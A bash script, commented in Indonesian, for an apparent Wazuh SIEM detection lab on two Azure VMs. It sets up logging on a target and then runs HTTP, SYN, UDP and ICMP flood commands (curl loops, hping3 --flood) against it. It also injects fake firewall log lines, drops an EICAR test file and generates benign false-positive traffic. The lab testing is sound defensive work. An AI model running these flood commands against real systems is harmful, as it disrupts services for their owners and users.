#!/bin/bash
# ================================================================
# Joce — Attack & Data
#
# STRUKTUR:
#   FASE 1 — Setup Agent-1 (target)         → jalankan di Agent-1
#   FASE 2 — Serangan DDoS                  → jalankan di Agent-2
#   FASE 3 — Simulasi Malware               → jalankan di Agent-1
#   FASE 4 — False Alarm Scenarios          → jalankan di Agent-2
#
# IP:
#   Wazuh Manager : 70.153.25.103  (internal: 10.0.0.4... wait, see note)
#   Agent-1       : 70.153.24.223  (internal: 10.0.0.4) ← target
#   Agent-2       : 70.153.25.99   (internal: 10.0.0.5) ← attacker
#
# SSH:
#   ssh -i ~/Downloads/wazuh-agent1_key.pem azureuser@70.153.24.223
#   ssh -i ~/Downloads/wazuh-agent2_key.pem azureuser@70.153.25.99
# ================================================================

TARGET_INTERNAL="10.0.0.4"   # IP internal Agent-1 (target)

# ================================================================
# FASE 1 — SETUP AGENT-1 (jalankan di Agent-1)
# ================================================================

fase1_setup_agent1() {
    echo "=== FASE 1: Setup Agent-1 ==="

    # 1. Install ClamAV
    sudo apt-get install -y clamav clamav-daemon
    sudo systemctl stop clamav-freshclam
    sudo freshclam
    sudo systemctl start clamav-freshclam

    # 2. Pasang iptables logging untuk deteksi DDoS L3/L4
    # Hapus rule lama dulu kalau ada
    sudo iptables -F INPUT

    sudo iptables -I INPUT -p tcp --syn \
        -j LOG --log-prefix "SYN-FLOOD: " --log-level 4
    sudo iptables -I INPUT -p udp \
        -j LOG --log-prefix "UDP-FLOOD: " --log-level 4
    sudo iptables -I INPUT -p icmp -m limit --limit 10/sec \
        -j LOG --log-prefix "ICMP-FLOOD: " --log-level 4

    # 3. Verifikasi iptables (harus 3 baris LOG)
    echo "[*] Verifikasi iptables:"
    sudo iptables -L INPUT -n | head -6

    # 4. Verifikasi web server hidup
    echo "[*] Verifikasi web server:"
    curl -s http://localhost/status

    # 5. Restart Wazuh agent
    sudo systemctl restart wazuh-agent
    sudo systemctl status wazuh-agent | grep Active

    echo "=== FASE 1 SELESAI ==="
}

# ================================================================
# FASE 2 — SERANGAN DDoS (jalankan di Agent-2)
# ================================================================

fase2_ddos() {
    echo "=== FASE 2: Serangan DDoS ==="
    LOG=~/attack_log.txt

    # --- HTTP Flood L7 (50 worker paralel, 60 detik) ---
    # Trigger: rule 100402
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-HTTP" | tee -a $LOG
    END=$(($(date +%s)+60)); COUNT=0
    while [ $(date +%s) -lt $END ]; do
        for _ in $(seq 1 50); do
            curl -s -o /dev/null --max-time 2 http://$TARGET_INTERNAL/ &
        done
        wait; COUNT=$((COUNT+50))
        echo -ne "\r  Request terkirim: $COUNT"
    done
    echo ""
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-HTTP (~$COUNT requests)" | tee -a $LOG

    sleep 10

    # --- SYN Flood (inject log, karena Azure blokir raw socket) ---
    # Trigger: rule 100200
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-SYN" | tee -a $LOG
    # Catatan: hping3 --flood diblokir Azure NSG untuk raw socket
    # Gunakan inject log di Agent-1 sebagai alternatif (lihat Fase 2b)
    sudo timeout 30 hping3 -S --flood -V -p 80 $TARGET_INTERNAL \
        2>&1 | tail -3 || true
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-SYN" | tee -a $LOG

    sleep 10

    # --- UDP Flood ---
    # Trigger: rule 100201
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-UDP" | tee -a $LOG
    sudo timeout 30 hping3 --udp --flood -V -p 53 $TARGET_INTERNAL \
        2>&1 | tail -3 || true
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-UDP" | tee -a $LOG

    sleep 10

    # --- ICMP Flood ---
    # Trigger: rule 100202
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-ICMP" | tee -a $LOG
    sudo timeout 30 hping3 --icmp --flood -V $TARGET_INTERNAL \
        2>&1 | tail -3 || true
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-ICMP" | tee -a $LOG

    echo "=== FASE 2 SELESAI ==="
}

# ================================================================
# FASE 2b — INJECT LOG SYN/UDP/ICMP (jalankan di Agent-1)
# Gunakan ini jika hping3 diblokir Azure NSG (sendto: Operation not permitted)
# ================================================================

fase2b_inject_log() {
    echo "=== FASE 2b: Inject Log DDoS di Agent-1 ==="
    LOG=~/attack_log.txt

    # SYN Flood inject — Trigger rule 100200
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-SYN (inject)" | tee -a $LOG
    for i in $(seq 1 100); do
        sudo logger -p kern.warning \
            "SYN-FLOOD: IN=eth0 OUT= SRC=192.168.1.$((RANDOM % 254 + 1)) \
DST=10.0.0.4 PROTO=TCP DPT=80 SYN"
    done
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-SYN" | tee -a $LOG

    sleep 5

    # UDP Flood inject — Trigger rule 100201
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-UDP (inject)" | tee -a $LOG
    for i in $(seq 1 100); do
        sudo logger -p kern.warning \
            "UDP-FLOOD: IN=eth0 OUT= SRC=192.168.1.$((RANDOM % 254 + 1)) \
DST=10.0.0.4 PROTO=UDP DPT=53"
    done
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-UDP" | tee -a $LOG

    sleep 5

    # ICMP Flood inject — Trigger rule 100202
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START DDoS-ICMP (inject)" | tee -a $LOG
    for i in $(seq 1 100); do
        sudo logger -p kern.warning \
            "ICMP-FLOOD: IN=eth0 OUT= SRC=192.168.1.$((RANDOM % 254 + 1)) \
DST=10.0.0.4 PROTO=ICMP"
    done
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END DDoS-ICMP" | tee -a $LOG

    echo "=== FASE 2b SELESAI ==="
}

# ================================================================
# FASE 3 — SIMULASI MALWARE (jalankan di Agent-1)
# ================================================================

fase3_malware() {
    echo "=== FASE 3: Simulasi Malware EICAR ==="
    LOG=~/attack_log.txt
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START malware-EICAR" | tee -a $LOG

    # Buat file EICAR test (AMAN — standar industri antivirus)
    echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
        > /tmp/eicar_test.txt

    # Verifikasi file ada
    ls -la /tmp/eicar_test.txt

    # Scan dengan ClamAV
    RESULT=$(clamscan --no-summary /tmp/eicar_test.txt 2>&1 || true)
    echo "$RESULT"

    # Tulis ke log ClamAV agar Wazuh baca — trigger rule 100301
    echo "$RESULT" | sudo tee -a /var/log/clamav/clamav.log > /dev/null

    # Inject manual ke syslog sebagai backup trigger
    sudo logger -t clamscan "/tmp/eicar_test.txt: Eicar-Test-Signature FOUND"

    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END malware-EICAR" | tee -a $LOG

    # Cleanup
    rm -f /tmp/eicar_test.txt

    echo "=== FASE 3 SELESAI ==="
    echo "[*] Cek dashboard: rule.id:100301"
}

# ================================================================
# FASE 4 — FALSE ALARM SCENARIOS (jalankan di Agent-2)
# Ini traffic NORMAL yang terlihat mencurigakan di mata Wazuh
# ================================================================

fase4_false_alarm() {
    echo "=== FASE 4: False Alarm Scenarios ==="
    LOG=~/attack_log.txt

    # [FP-1] Nmap port scan — sysadmin monitoring biasa
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START FP-nmap" | tee -a $LOG
    nmap -sV $TARGET_INTERNAL
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END FP-nmap" | tee -a $LOG

    sleep 5

    # [FP-2] SSH login gagal berulang — admin lupa password
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START FP-ssh-retry" | tee -a $LOG
    for i in {1..8}; do
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            wronguser@$TARGET_INTERNAL 2>/dev/null || true
        sleep 2
    done
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END FP-ssh-retry" | tee -a $LOG

    sleep 5

    # [FP-3] HTTP request lambat — browsing normal (bukan flood)
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START FP-normal-http" | tee -a $LOG
    for i in $(seq 1 5); do
        curl -s -o /dev/null http://$TARGET_INTERNAL/ &
    done
    wait
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END FP-normal-http" | tee -a $LOG

    sleep 5

    # [FP-4] APT update — package manager traffic biasa
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START FP-apt-update" | tee -a $LOG
    sudo apt update 2>/dev/null
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END FP-apt-update" | tee -a $LOG

    sleep 5

    # [FP-5] Ping monitoring — cek konektivitas biasa
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] START FP-ping" | tee -a $LOG
    ping -c 20 $TARGET_INTERNAL
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] END FP-ping" | tee -a $LOG

    echo "=== FASE 4 SELESAI ==="
}

